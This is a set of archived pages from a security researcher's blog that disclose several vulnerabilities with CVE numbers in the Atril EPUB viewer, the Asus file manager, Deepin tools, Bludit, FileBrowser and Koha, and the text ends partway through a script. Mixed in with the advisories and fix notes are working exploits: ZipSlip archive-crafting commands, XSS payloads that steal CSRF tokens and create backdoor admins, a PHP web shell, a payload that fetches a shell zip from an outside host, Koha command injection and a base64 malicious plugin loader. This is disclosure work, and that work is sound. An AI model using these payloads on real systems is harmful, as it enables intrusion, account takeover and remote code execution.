Then, I tried changing the filename to something like ../../../../tmp/test.txt and that worked too, a file named test.txt was successfully created under /tmp upon opening the epub document. First I thought it was a vulnerability in Kali Linux and downloaded the latest ISO of Kali from their official site and built a VM to test it out. Guess what? It worked on the latest version of Kali too. The software responsible for opening epub files in Kali is Atril, I then went to Google to read more about Atril Document Viewer and found out that it is the default Document reader for MATE desktop environment. After knowing that, I immediately switched to my Parrot OS VM to reproduce the same vulnerability, and that worked in Parrot OS as well. I also tested it out on Ubuntu’s MATE variant called Ubuntu-MATE and found that it was also vulnerable. The MATE desktop environment itself is vulnerable.

I also tried to reproduce this on various other Linux distros with other Desktop Environments and found out that Linux Mint is also vulnerable.

#### [+] Achieving Remote Command Execution:

This vulnerability can’t be exploited to overwrite existing files, it can only create new files under any specified locations, but that doesn’t stop us from achieving RCE. I tried out using the vulnerability to write a .desktop entry under $HOME/.config/autostart and then I logged out and logged back in, the malicious .desktop entry got triggered and I got Remote Command Execution. I also tried placing an authorized\_keys file under .ssh/ directory and achieved RCE via SSH. Note: If a directory is not present it will create the directory automatically.

Who knows about the Ebook format? Hasn’t everyone switched to PDF?

The answer is no, EPUB is still a popular and powerful document format, but many people prefer PDF. Most of them are familiar with PDFs. So, I was trying to maximize this vulnerability impact. Another Interesting thing I noticed was, when renaming the .epub document to something.pdf, the vulnerable Document Viewer (Atril/Xreader) tries to open the something.pdf file and reads it as an EPUB document because it is responsible for reading both EPUB and PDF, it also supports many other document formats as well. In other words, we can rename our crafted something.epub to something.pdf and then send it to the target to achieve RCE on the target.

So everything is good, we could create an exploit that’ll craft an epub/pdf pair to write malicious .desktop entries under /home//.config/autostart/ directory. But there’s a small problem, the target user’s username is required for successful exploitation of this bug. What if we don’t know the username? No Easy RCE? Needs to guess Username? Needs to try random common usernames? Let’s see what I got..

Upon further analysis, I found out that we can use the /proc/self/cwd to access the user’s home directory if he downloads the crafted document and opens it somewhere inside his home directory such as the ~/Downloads/, ~/Documents/ directory. So we can exploit the path traversal bug to achieve RCE just by using the gadget ../../../../../proc/self/cwd/../.config/autostart/exploit.desktop.

I have created a fully working exploit for this vulnerability (exploit\_rce.sh) and a script to write and include custom files for path traversal (exploit\_file\_write.sh).

**Exploit**: <https://github.com/febinrev/slippy-book-exploit.git>

**Zero Day Initiative Advisory:** <https://www.zerodayinitiative.com/advisories/ZDI-23-1835/>

*Update the Document Viewers to the latest version on your Distros!*

Thanks for Reading.

# [Zip Path Traversal in Asus Smartphone’s default FileManager App.](https://febin0x4e4a.wordpress.com/2024/01/10/zip-path-traversal-in-asus-smartphones-default-filemanager-app/)

[10th January 2024](https://febin0x4e4a.wordpress.com/2024/01/10/zip-path-traversal-in-asus-smartphones-default-filemanager-app/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2024/01/10/zip-path-traversal-in-asus-smartphones-default-filemanager-app/#respond)

**Zip Path traversal(ZipSlip) to arbitrary file write/overwrite in Asus default Android FileManager affecting all Asus Smartphones.**

This vulnerability is found in the latest version of the default file manager of Asus smartphones which comes pre-installed with the devices and also can’t be uninstalled. An attacker can create a crafted zip archive with path traversal to write/overwrite files in arbitrary locations on the target Smartphone. This vulnerability is dangerous as this can be abused to overwrite targetted files on the victim device or overwrite files that have patterns in the filenames like the photos taken from the camera, WhatsApp audio messages, WhatsApp Voice notes, Telegram Files, and much more. Also, Asus FileManager doesn’t prompt user confirmation before overwriting existing files which makes it easier for an attacker to exploit the vulnerability to overwrite existing files on the victim’s device.

**Severity**: *HIGH*

Affected Software and Version: Asus File Manager(com.asus.filemanager) <= 2.8.0.85\_230220 latest

**Proof-Of-Concept:**

1. Craft a path-traversal zip archive (here I created it on my Linux machine)

`$ echo PWNED > 001001001001001sdcard1poc1pwn.txt`

`$ zip trav.zip 001001001001001sdcard1poc1pwn.txt`

`$ sed -i s/"0"/"."/g trav.zip`

`$ sed -i s/"1"/"\/"/g trav.zip`

2. Transfer the zip file (trav.zip) to the Asus or Tecno device.
3. Open the archive and extract it with the default file manager
4. You will be able to see a file named pwn.txt under /sdcard/poc/pwn.txt

**Tested Devices:**

Asus Rog phone 5 and other devices with Asus Filemanager installed

# [CVE-2023-50255: Critical RCE Vulnerability in Deepin Linux’s default Archiver.](https://febin0x4e4a.wordpress.com/2024/01/10/cve-2023-50255-critical-rce-vulnerability-in-deepin-linuxs-default-archiver/)

[10th January 2024](https://febin0x4e4a.wordpress.com/2024/01/10/cve-2023-50255-critical-rce-vulnerability-in-deepin-linuxs-default-archiver/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2024/01/10/cve-2023-50255-critical-rce-vulnerability-in-deepin-linuxs-default-archiver/#respond)

## Zip Path Traversal (ZipSlip) in Deepin-Compressor

This is my 7th Published CVE.

## Description

Deepin-Compressor is the default archive manager of Deepin Linux OS. A path traversal vulnerability in deepin-compressor can be exploited to achieve Remote Command Execution on the target system upon opening crafted archives.

### Details

While decompressing/extracting zip archives, deepin-compressor is not validating the file names. Adding one or more “../” as prefixes to the filenames will lead to path traversal. This leads to arbitrary file write and RCE.

### PoC

Steps to create such zip archive:

1. Create a file for traversal

```

echo "TEST" > XXYXXYXXYtmpYpoc.txt

```

2. Make a normal zip archive

```

zip poc.zip XXYXXYXXYtmpYpoc.txt

```

3. Craft malicious archive

```

sed -i s/"XXY"/"..\/"/g poc.zip
sed -i s/"tmpY"/"tmp\/"/g poc.zip

```

By following the above steps, you can create a malicious zip archive, upon extracting that archive, a file named poc.txt will be created under /tmp directory

### Impact

Remote Command Execution: By exploiting the vulnerability an attacker can place malicious desktop entries under ~/.config/autostart to achieve RCE on the target

**Fix**: If you’re using Deepin Linux, update deepin-compressor to the latest version 5.12.21

# [CVE-2023-50254: Critical RCE in Deepin Linux Desktop OS’s default document reader](https://febin0x4e4a.wordpress.com/2023/12/22/cve-2023-50254-critical-rce-in-deepin-linux-desktop-oss-default-document-reader/)

[22nd December 202322nd December 2023](https://febin0x4e4a.wordpress.com/2023/12/22/cve-2023-50254-critical-rce-in-deepin-linux-desktop-oss-default-document-reader/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2023/12/22/cve-2023-50254-critical-rce-in-deepin-linux-desktop-oss-default-document-reader/#respond)

This is my 6th published CVE.

### Summary

Deepin Linux’s default document reader “**deepin-reader**” software ***<** **6.0.7***suffers from a serious vulnerability due to a design flaw that leads to Remote Command Execution via crafted docx document.

### Details

Deepin-reader is the default document reader for the Operating System Deepin Linux. The deepin-reader performs some shell command operations while dealing with docx document format.

1. When opening a docx document, deepin-reader creates a temporary directory under /tmp and place the docx document under the directory
2. Then deepin-reader calls the “unzip” shell command to extract the docx file
3. After the extraction process, deepin-reader calls “pandoc” command to convert the docx file to an HTML file named “temp.html” under word/ directory (created when the docx file is extracted with unzip).
   The command will look something like this, “pandoc temp.docx -o word/temp.html
4. Then deepin-reader will try to convert that HTML file to PDF and open the pdf.

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2023/12/image.png?w=1024)

This happens when we open a docx file in Deepin Linux OS.

This behavior can be exploited by placing a symlink named word/temp.html inside a crafted malicious docx pointing to any file inside the target system.

So, while opening the docx file, pandoc will write to the system file that the symlink word/temp.html is pointing to.

This is a File overwrite vulnerability.
A Remote Code Execution can be achieved by overwriting files like .bashrc, .bash\_login etc. Rce will be triggered when the user opens the terminal.

We can force pandoc to write/overwrite files(.bashrc) in the right format to execute arbitrary commands.

**Advisory:** <https://github.com/linuxdeepin/developer-center/security/advisories/GHSA-q9jr-726g-9495>

Update Deepin Linux and deepin-reader to the latest version.

**Download the PoC exploit**: [https://github.com/febinrev/deepin-linux\_reader\_RCE-exploit/](https://github.com/febinrev/deepin-linux_reader_RCE-exploit/tree/main)

# [Stored-XSS to Admin Account Takeover/RCE in Bludit CMS [CRITICAL]](https://febin0x4e4a.wordpress.com/2023/10/06/stored-xss-to-admin-account-takeover-rce-critical/)

[6th October 20232nd November 2023](https://febin0x4e4a.wordpress.com/2023/10/06/stored-xss-to-admin-account-takeover-rce-critical/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2023/10/06/stored-xss-to-admin-account-takeover-rce-critical/#respond)

### Description

There’s a Stored/Persistent Cross-Site Scripting vulnerability in Bludit CMS below 3.15.0 that allows a blog Author(or an attacker with Author user privileges) to create a backdoor Administrator user and even achieve Remote Code Execution on the system. This exploit happens because of the fact that Bludit is not sanitizing any dangerous javascript that’s being injected inside page contents by the Author user, even though the cookie has “httpOnly” flag and the app has a CSRF token in place, this won’t prevent the exploitation.

The attacker (who has Author privs) can carefully craft malicious JS payload that steals Admin’s CSRF token and sends an XHR post request to “/admin/new-user” to create a new Administrator in the background, when the real Admin visits the malicious Blog/Page the JS will get executed in the background. Attacker can then log in to Bludit as the newly created Admin.

Remote Code Execution is achieved by abusing the “Remote Content” plugin. The attacker (who has Author privs) can carefully craft malicious JS payload that steals the Admin’s CSRF token and send XHR Requests in the background that enable “Remote Content” plugin and configure the plugin to download the attacker-controlled malicious zip file from the attacker’s server and also calls the webhook to trigger the plugin. When the real Admin visits the malicious Blog/Page the JS will get executed in the background, now the attacker can simply navigate to “[http://<bludit\_URL>/bl-content/workspaces/remote-content/shell.php&#8221](http://<bludit_URL>/bl-content/workspaces/remote-content/shell.php%26#8221);

![](https://user-images.githubusercontent.com/52229330/254687626-7aee1474-c147-4175-a87a-25d72e44dc2d.png)
### Steps to reproduce the problem

#### Payload1 : Creates another Admin in the background

```
<h2>Hi</h2>

<script>
fetch("/admin/content").then(response => response.text()).then((response) => {

window.tokenCSRF = response.match(/var\s+tokenCSRF\s*=\s*"(.+)"/)[1];  // Steal CSRF token

const xhr = new XMLHttpRequest();
xhr.open("POST", "/admin/new-user", true);
xhr.withCredentials = true;

xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

xhr.onreadystatechange = () => {
  if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
    // Request finished. Do processing here.
  }
};
xhr.send("save=&tokenCSRF="+tokenCSRF+"&new_username=pwn&new_password=pwn123&confirm_password=pwn123&role=admin&email=admin3%40feb.com");  // creating backdoor admin user

}).catch(err => console.log(err))

</script>
```
#### Payload2 : XSS to RCE

```
<h2>Hi Admin</h2>

<script>
fetch("/admin/content").then(response => response.text()).then((response) => {

window.tokenCSRF = response.match(/var\s+tokenCSRF\s*=\s*"(.+)"/)[1];  //Steal CSRF token

// Install Remote Content Plugin
const inst_plugin = new XMLHttpRequest();
inst_plugin.open("GET", "/admin/install-plugin/pluginRemoteContent", true);
inst_plugin.withCredentials = true;
inst_plugin.send()

// Shell upload plugin configue
const xhr = new XMLHttpRequest();
xhr.open("POST", "/admin/configure-plugin/pluginRemoteContent", true);
xhr.withCredentials = true;

xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

xhr.onreadystatechange = () => {
  if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
    // Request finished. Do processing here.
  }
};
xhr.send("save=&tokenCSRF="+tokenCSRF+"&webhook=trigger&source=http://192.168.1.39/shell2.zip");  // creating backdoor shell (replace the http://192.168.1.39/shell2.zip with a your own link to the plugin

// Trigger the exploit by calling the Webhook
const trigger = new XMLHttpRequest();
trigger.open("GET", "/trigger", true);
trigger.withCredentials = true;
trigger.send()

}).catch(err => console.log(err))

</script>
```
#### shell.php:

```
<?php system($_GET["cmd"]); ?>
```

1. Log in as Blog Author
2. Create new content.
3. Intercept the HTTP request using any proxy tool such as BurpSuite, URL-encode the payload1 HTML/JS code, and place it inside the “content” parameter of the POST request like below.

![](https://user-images.githubusercontent.com/52229330/254681795-85759fef-0eb1-43e5-b186-6734fd4b72fb.png)

4. To verify it, Open another private browser window and log in as Admin, then visit the malicious content created by the Author, you will be able to see a new user has been created under the users list.

![](https://user-images.githubusercontent.com/52229330/254683692-06e167e7-fc71-452b-96d0-62e71c79077b.png)
#### REMOTE CODE EXECUTION:

1. In order to achieve Remote Code Execution, we need to first create a malicious plugin and serve it for further exploitation

![](https://user-images.githubusercontent.com/52229330/254685541-e03bd9b6-4161-4f27-bc5f-d52780705122.png)

2. URL-encode the payload2 from above, and make changes according to your own environment, then place it inside the “content” parameter in the HTTP request that’s intercepted

![](https://user-images.githubusercontent.com/52229330/254686113-6f94c33e-ac52-42b2-8972-295c4a1a5d76.png)

3. When the admin visits the malicious blog/page, the attacker will achieve RCE on the system.

Payload triggered:

[![](https://user-images.githubusercontent.com/52229330/254686495-e88d42a4-1e9c-40d9-a01c-0668e4a9f007.png)](https://user-images.githubusercontent.com/52229330/254686495-e88d42a4-1e9c-40d9-a01c-0668e4a9f007.png)

Got Code Execution on target System:

[![](https://user-images.githubusercontent.com/52229330/254687321-ea89c8d6-fe23-4dbf-a9a4-cc3dcbb06a35.png)](https://user-images.githubusercontent.com/52229330/254687321-ea89c8d6-fe23-4dbf-a9a4-cc3dcbb06a35.png)

RCE on the target!

*If you are using Bludit CMS in production update to the newer version with patches,always verify the authors, and only allow author accounts to trusted persons in your organization/team.*

# [Stored XSS in FileBrowser leads to Admin account Takeover + RCE](https://febin0x4e4a.wordpress.com/2023/09/15/xss-in-filebrowser-leads-to-admin-account-takeover-in-filebrowser/)

[15th September 202318th September 2023](https://febin0x4e4a.wordpress.com/2023/09/15/xss-in-filebrowser-leads-to-admin-account-takeover-in-filebrowser/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2023/09/15/xss-in-filebrowser-leads-to-admin-account-takeover-in-filebrowser/#respond)

**CVE-2023-39612**

### Description

A Cross-Site Scripting vulnerability is discovered in FileBrowser *below v2.25.0* in which an attacker with a non-admin user account inside the FileBrowser instance can create malicious HTML & JS files, craft them in a specific way, and send the HTML file’s link to the Admin to achieve Account takeover via XSS bypassing the Content-Security-Policy.

**Proof-Of-Concept**:

// *xss.js*

```

alert(document.cookie);

```

// *xss.htm*

```

<script src="/api/raw/poc/xss.js?auth=[jwt_token of the Low Privileged user]"></script>

```

1. Create a folder named “poc” as the non-admin user.
2. Create the 2 files as above (xss.htm and xss.js) under the poc folder.
3. Craft the XSS URL as below and open it as the Admin user to verify the XSS.

```

http://your_filebrowser_ip:port//api/raw/poc/xss.htm?auth=[non-admin user's jwt token]&inline=true

```

It will trigger an alert pop-up with Admin’s Cookie.

#### Explanation

* The parameter “?auth=[non-admin token]” is added in the URL so that when the Admin opens the URL it will fetch those HTML/js files that are created by the non-admin user, otherwise FileBrowser will use the Admin’s original jwt token that’s been stored as Cookie thus leading to a “404 Not Found” Error. This is because those files are created by the non-admin user, so if the API tries to fetch them with Admin’s token it will lead to an error, the API also accepts the jwt token inside a URL get parameter “?auth=”. So, the non-admin user can deliberately supply his own JWT token in the malicious URL for a successful exploitation
* The “?inline=true” parameter is included in the crafted URL because without that parameter FileBrowser will treat the HTML file as an attachment and will download it as a file, so by having “inline=true” the HTML file will be treated as an webpage, and execute the javascript.
* Content-Security-Policy(CSP) is bypassed because FileBrowser sets CSP “default-src” to ‘self’. As the malicious JS is also loaded from the same site, it will get executed.

### Impact

This vulnerability is capable of Admin account takeover. Admin can even run system shell commands and access the filesystem, thus leading to Arbitrary Command execution.

**Fix**:

They fixed the vulnerability by adding a CSP that blocks any Javascript from executing on /api/raw endpoint.

<https://github.com/filebrowser/filebrowser/commit/b508ac3d4f7f0f75d6b49c99bdc661a6d2173f30>

Update to the latest version if you are using Filebrowser.

**Filebrowser v2.25.0 is released**

<https://github.com/filebrowser/filebrowser/releases>

# [XSS vulnerability in Koha integrated library system](https://febin0x4e4a.wordpress.com/2023/01/11/xss-vulnerability-in-koha-integrated-library-system/)

[11th January 202311th January 2023](https://febin0x4e4a.wordpress.com/2023/01/11/xss-vulnerability-in-koha-integrated-library-system/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2023/01/11/xss-vulnerability-in-koha-integrated-library-system/#respond)

This is Febin, a Security Researcher. This article is about a Cross-Site Scripting vulnerability I found in a popular library management system named Koha.

**Koha Library Software**:

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2023/01/koha.png?w=394)

Koha is an open-source integrated library system (ILS), used world-wide by public, school and special libraries.

Koha is a web-based ILS, with a SQL database (MariaDB or MySQL preferred) back end with cataloguing data stored in MARC and accessible via Z39.50 or SRU. The user interface is very configurable and adaptable and has been translated into many languages. Koha has most of the features that would be expected in an ILS, including:

```

Various Web 2.0 facilities like tagging, comment, social sharing and RSS feeds
Union catalog facility
Customizable search
Online circulation
Bar code printing
Patron card creation
Report generation
Patron self registration form through OPAC

```

Official Site: <https://koha-community.org/>

**The Vulnerability:**

A Cross-Site Scripting (XSS) vulnerability has been found in Koha Library software that can be used by an external attacker to steal credentials, deliver malware and take over admin account for further exploitation.

The vulnerability exists in the “HTML customizations” and “News” features under “Additional tools”(/cgi-bin/koha/tools/additional-contents.pl).

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2023/01/koha_html.png?w=1024)

An attacker can craft a URL and send it to the victim, if the victim is authenticated, then the javascript will get executed and if he’s not authenticated then Koha will prompt its login, after successful sign-in, the XSS payload will get executed. And the payload will be stored under the “HTML customizations” section i.e, whenever the victim visits that section, the XSS payload will be triggered thus making this a persistent XSS

## Proof Of Concept:

There are many demo instances of Koha software that are hosted online and are officially listed on Koha’s official website.

I have used a couple of demo Koha instances to test and prove the vulnerability.

Demo 1: intranet-demo.biblibre.com

Demo Credentials: test/test

<https://intranet-demo.biblibre.com/cgi-bin/koha/tools/additional-contents.pl?op=add_validate&category=html_customizations&code=&idnew=38&redirect=&editmode=wysiwyg&location=&&title_default=test&content_default=%3Cimg+src=X+onerror=alert(%27FEBIN%27)%3E&lang=default>

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2023/01/koha_xss1-1.png?w=1024)

Demo 1: demo-admin.catalyst-koha.com.au

Demo Credentials: staff/staff1

<https://demo-admin.catalyst-koha.com.au//cgi-bin/koha/tools/additional-contents.pl?op=add_validate&category=html_customizations&code=&idnew=38&redirect=/&editmode=wysiwyg&location=&&title_default=test&content_default=%3Cimg+src=X+onerror=alert(%27FEBIN%27)%3E&lang=default>

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2023/01/koha_xss2.png?w=1024)

**Fix:** Disable Javascript in HTML customizations, Sanitize user input, Use anti-CSRF token

<https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html>

**Thanks.**

# Posts navigation

[← Older posts](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/page/2/)

Search for:

# Recent Posts

* [Privilege Escalation Vulnerability in Balena Etcher Software](https://febin0x4e4a.wordpress.com/2024/08/22/privilege-escalation-vulnerability-in-balena-etcher-software/)
* [CVE-2024-28739, CVE-2024-28740: XSS to One-Click RCE in Koha ILS](https://febin0x4e4a.wordpress.com/2024/03/07/xss-to-one-click-rce-in-koha-ils/)
* [CVE-2023-44452, CVE-2023-51698: CBT File Parsing Argument Injection that affected Popular Linux Distros](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44452-cve-2023-51698-cbt-file-parsing-argument-injection-that-affected-popular-linux-distros/)
* [CVE-2023-44451, CVE-2023-52076: EPUB File Parsing Directory Traversal RCE Vulnerability affecting popular distros](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44451-cve-2023-52076-epub-file-parsing-directory-traversal-rce-vulnerability-affecting-popular-distros/)
* [Zip Path Traversal in Asus Smartphone’s default FileManager App.](https://febin0x4e4a.wordpress.com/2024/01/10/zip-path-traversal-in-asus-smartphones-default-filemanager-app/)
# Recent Comments

# Archives

* [August 2024](https://febin0x4e4a.wordpress.com/2024/08/)
* [March 2024](https://febin0x4e4a.wordpress.com/2024/03/)
* [January 2024](https://febin0x4e4a.wordpress.com/2024/01/)
* [December 2023](https://febin0x4e4a.wordpress.com/2023/12/)
* [October 2023](https://febin0x4e4a.wordpress.com/2023/10/)
* [September 2023](https://febin0x4e4a.wordpress.com/2023/09/)
* [January 2023](https://febin0x4e4a.wordpress.com/2023/01/)
* [March 2022](https://febin0x4e4a.wordpress.com/2022/03/)
* [January 2022](https://febin0x4e4a.wordpress.com/2022/01/)
# Categories

* [Uncategorized](https://febin0x4e4a.wordpress.com/category/uncategorised/)

[Create a free website or blog at WordPress.com.](https://wordpress.com/?ref=footer_website)

[febiNJ](https://febin0x4e4a.wordpress.com/)

[Blog at WordPress.com.](https://wordpress.com/?ref=footer_blog)

* Subscribe
  Subscribed

  + [![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/cropped-hacker-operate-laptop-cartoon-illustration_188898-166.jpg?w=50) febiNJ](https://febin0x4e4a.wordpress.com)

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Ffebin0x4e4a.wordpress.com%2F2024%2F08%2F22%2Fprivilege-escalation-vulnerability-in-balena-etcher-software%2F&signup_flow=account)
* Privacy
* + [![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/cropped-hacker-operate-laptop-cartoon-illustration_188898-166.jpg?w=50) febiNJ](https://febin0x4e4a.wordpress.com)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Ffebin0x4e4a.wordpress.com%2F2024%2F08%2F22%2Fprivilege-escalation-vulnerability-in-balena-etcher-software%2F&signup_flow=account)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://febin0x4e4a.wordpress.com)
  + [View site in Reader](https://wordpress.com/read/blogs/201901473)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

##

##

Loading Comments...

Write a Comment...

Email (Required)

Name (Required)

Website

###

![](https://pixel.wp.com/b.gif?v=noscript)
Design a site like this with WordPress.com[Get started](https://wordpress.com/start/?ref=marketing_bar)


=== Content from febin0x4e4a.wordpress.com_385ff2bc_20250115_193555.html ===

# [febiNJ](https://febin0x4e4a.wordpress.com/)

## InfoSec Enthusiast

Menu
[Skip to content](#content)

* [Home](https://febin0x4e4a.wordpress.com/)
* [About](https://febin0x4e4a.wordpress.com/about/)

Search

Search for:

# Exploit

# [CVE-2024-28739, CVE-2024-28740: XSS to One-Click RCE in Koha ILS](https://febin0x4e4a.wordpress.com/2024/03/07/xss-to-one-click-rce-in-koha-ils/)

[7th March 202417th April 2024](https://febin0x4e4a.wordpress.com/2024/03/07/xss-to-one-click-rce-in-koha-ils/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2024/03/07/xss-to-one-click-rce-in-koha-ils/#respond)

```
![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2024/03/koha2.png)

PART-1 (Arbitrary Command Injection) [CVE-2024-28739]

An Arbitrary Command injection vulnerability has been discovered in the latest version (23.05) of Koha ILS. The vulnerability is present in the Task Scheduler feature, which allows arbitrary input from the user and appends it to a system command.
An Attacker can Schedule a task and intercept and modify the HTTP request using a proxy tool like BurpSuite and inject arbitrary system commands with backticks (`) inside the "format=" parameter, the arbitrary command will then execute on the system at the scheduled time.

Severity: HIGH

The HTTP request will look something like this:

mode=job_add&starttime=09%3A40&startdate=&report=1&format=text`[Arbitrary Command here]`&email=

The command Task Scheduler is scheduling a command on the system that will look something like this:

export KOHA_CONF="/etc/koha/sites/library/koha-conf.xml"; /usr/share/koha/bin/cronjobs/runreport.pl 1 --format=text --to=

Steps to Reproduce:

1. Log in to Koha Intranet as Admin Staff
2. Go to Task Scheduler (/cgi-bin/koha/tools/scheduler.pl)
3. Schedule a task, and set the time for the job to execute (current server time+2 minutes)
4. Intercept the HTTP Request and Inject any arbitrary command

mode=job_add&starttime=[TIME here]&startdate=&report=1&format=text`[Arbitrary Command here]`&email=

5. Forward the request.
6. Important thing to note here is that this is a Blind Arbitrary Command Injection i.e., we wouldn't be able to see the command output but it will execute anyways. So use "whoami>/tmp/whoami.txt" as the injection command.

mode=job_add&starttime=09%3A40&startdate=&report=1&format=text`whoami+>/tmp/whoami.txt`&email=

7. Wait for some time and you will be able to see a file named whoami.txt being created in/tmp directory on the target server, if you read it will see "library-koha"(koha system username).

PART-2 (XSS to RCE) [CVE-2024-28740]

The above command injection vulnerability can only be exploited if the adversary has the credentials for the Koha Intranet Staff Admin user! Any ways to exploit this without having credentials? The answer is yes! We can trigger this RCE vulnerability just by sending the admin a URL/Link.

This can be achieved by abusing the "Additional contents (HTML customizations)" feature in Koha. This is basically a Cross-Site Scripting (XSS) vulnerability that can be used to bypass CSRF protections in Koha (SameSite=Lax cookie attribute and csrf_token). The HTML customizations feature allows the admin to add HTML content, it also accepts custom javascript.

This is where the problem arises, the attacker can carefully craft a URL with some malicious javascript that adds a task to Task Scheduler to trigger the Command Injection Vulnerability when the admin Staff patron loads the URL in his browser with an authenticated session of Koha, it will add the malicious script to "Additional contents" and the javascript will be executed. In this way, the attacker can gain access to the target system.

In fact, there's an httpOnly flag set for the cookie by Koha and Javascript can't just read the session cookie, this XSS can also be used to steal the CSRF token and forcefully change username and password to completely takeover the Admin Staff account.

If there is Plugin upload feature enabled by the admin, this can be used to drop a malicious plugin to Koha in the background to achieve Remote Code Execution on the target system.

 Proof-Of-Concept:

1. Open Koha Intranet URL
2. Navigate to
[Your Koha domainname]/cgi-bin/koha/tools/additional-contents.pl?op=add_validate&category=html_customizations&code=&idnew=38&redirect=/&editmode=wysiwyg&location=&&title_default=test&content_default=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&lang=default

This will execute a simple javascript alert to prove the existence of the vulnerability

I have developed fully working exploits for all the above issues (Authenticated RCE, XSS to RCE, XSS to Account takeover, XSS to plugin upload RCE),

i) I have developed Javascript code that directly uploads malicious plugins to Koha and enables the plugin without any Account takeover.

ii) To reproduce the issue, you may host the JS code yourself and include it in the XSS payload like '<script src="http://your.attacker.machine/xsrf_plugin.js"></script>'

xsrf_plugin.js:

-----------------------------------------------------------------
```
function csrf_to_rce(){

function dataURItoBlob(dataURI) {

  var byteString;

  if (dataURI.split(',')[0].indexOf('base64') >= 0)
    byteString = atob(dataURI.split(',')[1]);
  else
    byteString = unescape(dataURI.split(',')[1]);

  // separate out the mime component
  var mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];

  // write the bytes of the string to a typed array
  var ia = new Uint8Array(byteString.length);

  for (var i = 0; i < byteString.length; i++) {
    ia[i] = byteString.charCodeAt(i);
  }

  return new Blob([ia], {
    type: mimeString
  });
}

var dataUri = "data:application/zip;base64,UEsDBAoAAAAAAHpk91YAAAAAAAAAAAAAAAAFABwAS29oYS9VVAkAA1DRvGSM0bxkdXgLAAEEAAAAAAQAAAAAUEsDBAoAAAAAAJVI+FYAAAAAAAAAAAAAAAAMABwAS29oYS9QbHVnaW4vVVQJAANS8b1kXPG9ZHV4CwABBAAAAAAEAAAAAFBLAwQKAAAAAAD2s/RWAAAAAAAAAAAAAAAAEAAcAEtvaGEvUGx1Z2luL1JjZS9VVAkAA3douWQyMr1kdXgLAAEEAAAAAAQAAAAAUEsDBBQAAAAIAJVI+FbYjsVGowEAAEYDAAASABwAS29oYS9QbHVnaW4vUmNlLnBtVVQJAANR8b1kMjK9ZHV4CwABBAAAAAAEAAAAAJVRXWvcMBB8169YzEEukFx8CX2Iy4XSkkIpbcMV8irW9t5ZjSU5+mh6lPz3rnxyc0nzUmEse3Z2d2ZXDNjc4Zbgs+2wqm76uFWmqtYNvRUieoIvtiXHyA25PkM18uv+YX6Y4qvqPcPHTLHRwez2ev3907evsIKiXCyLCdYUsMWAjP8WwMegJjg4qys44uZHJ2MUY+isex79SLUyOc6lSO5J1Ob4eXm+PC0vTsvLQ1Ic0tXmIsUTqdiTtDJKRy1/kvPKmrHS8nJRvlmUJT9lrqXx10taNC1t9tEJPZA7DSJLId84NYSJlLqETnkYxiECf60/XHOvRx6Y3/lAel48dBa1ujoLejgj0/A+ijRmseoI2wuoacPupSfTSk3e8zK9EPutQGftHYQOA7hoPDi17ULOYJggJ8B9pEip/eBswxi1grPzz1RWjqzF0HPvJgaW4GP9av+8XL2DOcw89ZsTmA3oUHs45tW/k6w/EV6ziFoq6awNyeXjX5uNs+aHraVJFvrdc4dsziizhTQc2DirAccE4IxJbNL6osg/Mv9fnRBLZv8BUEsBAh4DCgAAAAAAemT3VgAAAAAAAAAAAAAAAAUAGAAAAAAAAAAQAO1BAAAAAEtvaGEvVVQFAANQ0bxkdXgLAAEEAAAAAAQAAAAAUEsBAh4DCgAAAAAAlUj4VgAAAAAAAAAAAAAAAAwAGAAAAAAAAAAQAO1BPwAAAEtvaGEvUGx1Z2luL1VUBQADUvG9ZHV4CwABBAAAAAAEAAAAAFBLAQIeAwoAAAAAAPaz9FYAAAAAAAAAAAAAAAAQABgAAAAAAAAAEADtQYUAAABLb2hhL1BsdWdpbi9SY2UvVVQFAAN3aLlkdXgLAAEEAAAAAAQAAAAAUEsBAh4DFAAAAAgAlUj4VtiOxUajAQAARgMAABIAGAAAAAAAAQAAAO2BzwAAAEtvaGEvUGx1Z2luL1JjZS5wbVVUBQADUfG9ZHV4CwABBAAAAAAEAAAAAFBLBQYAAAAABAAEAEsBAAC+AgAAAAA=";

var blob = dataURItoBlob(dataUri);

         var formData = new FormData(),
          request  = new XMLHttpRequest();
          request.withCredentials = true;

    /** Configure the request */
